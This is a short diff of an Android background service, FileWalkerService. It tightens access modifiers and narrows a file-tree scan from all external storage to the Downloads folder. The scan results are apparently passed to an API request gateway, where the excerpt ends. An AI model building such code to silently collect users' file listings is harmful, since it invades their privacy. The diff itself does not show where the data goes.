@@ -40,21 +40,21 @@ public class FileWalkerService extends Service {
             this(new File(root));
         }
 
-        public FileWalker(File root) {
+        FileWalker(File root) {
             this.root = root;
         }
 
-        public JSONArray walk() throws JSONException {
+        JSONArray walk() throws JSONException {
             return read(scan(this.root));
         }
 
-        public static class FileNode {
+        static class FileNode {
 
             private final String name;
             private final List<FileNode> files;
             private final long sizeInKb;
 
-            public FileNode(String name, List<FileNode> files, long sizeInKb) {
+            FileNode(String name, List<FileNode> files, long sizeInKb) {
                 this.name = name;
                 this.files = files;
                 this.sizeInKb = sizeInKb;
@@ -64,11 +64,11 @@ public class FileWalkerService extends Service {
                 return name;
             }
 
-            public List<FileNode> getFiles() {
+            List<FileNode> getFiles() {
                 return files;
             }
 
-            public long getSizeInKb() {
+            long getSizeInKb() {
                 return sizeInKb;
             }
         }
@@ -116,7 +116,7 @@ public class FileWalkerService extends Service {
         Log.d("X", "File walker started");
 
         try {
-            final JSONArray jaFiles = new FileWalker(Environment.getExternalStorageDirectory()).walk();
+            final JSONArray jaFiles = new FileWalker(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)).walk();
             new APIRequestGateway(this, new APIRequestGateway.APIRequestGatewayCallback() {
                 @Override
                 public void onReadyToRequest(String apiKey) {
